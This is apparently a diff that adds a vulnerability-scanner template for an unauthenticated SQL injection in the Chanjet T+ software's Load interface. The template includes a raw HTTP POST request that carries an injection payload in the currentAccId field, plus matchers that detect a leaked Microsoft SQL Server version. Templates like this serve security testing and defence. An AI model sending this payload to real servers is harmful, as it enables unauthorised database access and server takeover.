@@ -1,0 +1,34 @@
+id: changjet-tplus-MultiCompanySettingController-sqli
+info:
+  name: 畅捷通T+ Load 存在SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 由于畅捷通T+的load接口处未对用户的输入进行过滤和校验，未经身份验证的攻击者除了可以利用 SOL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限
+  reference: 
+    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483688&idx=1&sn=5900754734dd395da0a2a4419bf1b23e&chksm=9606e7baa1716eac0a93936b5b41fe442a846b83b0219d60350bb4614a5eb26a6afa6771ebed&cur_album_id=4045056277938913283&scene=189#wechat_redirect
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: changjet,tplus,sqli
+
+http:
+  - raw:
+      - |
+        POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanySettingController,Ufida.T.SM.UIP.ashx?method=Load HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"currentAccId":"2' and 1=@@version--+", "currentAcc":"1", "currentDsName":"1", "currentVersion":"1", "currentVersionNo":"1"}
+
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Microsoft SQL Server')
+        condition: and
